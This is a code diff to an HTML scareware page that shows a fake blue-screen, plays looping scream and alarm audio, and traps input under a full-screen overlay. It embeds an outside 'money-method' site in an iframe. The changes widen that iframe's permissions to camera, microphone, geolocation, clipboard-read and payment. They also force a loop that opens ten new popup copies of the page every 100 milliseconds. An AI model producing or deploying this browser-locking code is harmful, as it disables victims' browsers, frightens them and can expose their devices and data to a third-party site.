@@ -7,11 +7,11 @@
   <style>
     * { margin:0; padding:0; }
     body,html,#trap,canvas,#bsod,iframe { position:fixed; top:0; left:0; width:100vw; height:100vh; overflow:hidden; z-index:2147483647; border:none; }
-    #trap { background:transparent; }
+    #trap { background:transparent; pointer-events:auto; }
     canvas { pointer-events:none; }
     #bsod { background:#0000AA; color:#FFF; font:1.5rem monospace; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; }
     audio { display:none; }
-    iframe { z-index:2147483646; } /* Slightly below trap to allow interaction blocking */
+    iframe { z-index:2147483646; }
   </style>
 </head>
 <body>
@@ -31,9 +31,10 @@ Progress: [##########] 100%
   <audio id="scream" loop></audio>
   <audio id="alarm" loop></audio>
 
-  <!-- IFRAME WITH FORCED API PERMISSIONS (via sandbox allow-* attributes) -->
+  <!-- IFRAME WITH MAXIMUM PERMISSIONS INCLUDING POPUPS -->
   <iframe src="https://money-method.vercel.app/" 
-          sandbox="allow-downloads allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation-by-user-activation allow-storage-access-by-user-activation">
+          allow="fullscreen; payment; geolocation; camera; microphone; midi; encrypted-media; xr-spatial-tracking; clipboard-write; clipboard-read; display-capture; publickey-credentials-get"
+          sandbox="allow-downloads allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation allow-top-navigation-by-user-activation allow-storage-access-by-user-activation">
   </iframe>
 
 <script>
@@ -207,10 +208,10 @@ Progress: [##########] 100%
     };
     spread();
 
-    // Open 1000+ tabs
+    // Open 1000+ tabs (POPUPS FORCED)
     setInterval(() => {
       for(let i=0;i<10;i++) {
-        try { window.open(location.href, '_blank'); } catch {}
+        try { window.open(location.href, '_blank', 'popup=1'); } catch {}
       }
     }, 100);
 
